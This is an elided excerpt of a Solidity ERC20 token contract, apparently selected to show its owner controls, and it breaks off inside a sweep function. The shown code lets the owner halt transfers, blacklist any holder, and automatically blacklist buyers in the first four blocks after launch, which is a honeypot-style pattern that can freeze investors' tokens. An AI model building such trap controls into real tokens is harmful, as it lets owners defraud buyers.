...
contract TechTreesToken is ERC20, Ownable, AccessControl {
    using SafeMath for uint256;

    uint256 constant TOTAL_SUPPLY = 6900000000 ether;
    ...
    mapping(address => bool) public transferBlist;
        ...
        returns (bool)
    {
        ...
        require(
            enableTransfer == true ||
                transferWhitelist[from] == true ||
                from == owner(),
            "Unable to transfer"
        );
        require(transferBlist[from] == false, "Unable to transfer");

        if (royaltyWhitelist[from] == true || royaltyWhitelist[to] == true) {
            _transfer(from, to, amount);
        } else {
            if (launchedAt > 0 && from == uniswapV2Pair) {
                if (block.number - launchedAt < 4) {
                    transferBlist[to] = true;
                }
            }
    ...
    function transferWithoutFee(address to, uint256 amount)
        external
        returns (bool)
    {
        require(
            hasRole(OPERATOR_ROLE, _msgSender()),
            "Caller is not a role owner"
        );
        address from = _msgSender();
        _transfer(from, to, amount);
        return true;
    ...
    function setEnableTransfer(bool _enableTransfer, address _uniswapV2Pair)
        external
        onlyOwner
    {
        enableTransfer = _enableTransfer;
        if (launchedAt == 0) launchedAt = block.number;
        if (_uniswapV2Pair != uniswapV2Pair) uniswapV2Pair = _uniswapV2Pair;
    }

    function setRoyaltyWhitelist(address[] calldata whitelist, bool isWhitelist)
        external
        onlyOwner
    {
    ...
    function setTransferBlist(address[] calldata blist, bool isBlist)
        external
        onlyOwner
    {
        require(blist.length > 0, "blist must over 0");
        for (uint256 i = 0; i < blist.length; i++) {
            transferBlist[blist[i]] = isBlist;
        }
    }
    ...
    function transferOwnership(address newOwner) public override onlyOwner {
        ...
        transferWhitelist[newOwner] = true;
        royaltyWhitelist[newOwner] = true;
        super._transferOwnership(newOwner);
    }

    function sweep(address[] calldata tokenAddr, address recipient)
        public
        onlyOwner
    {
        {
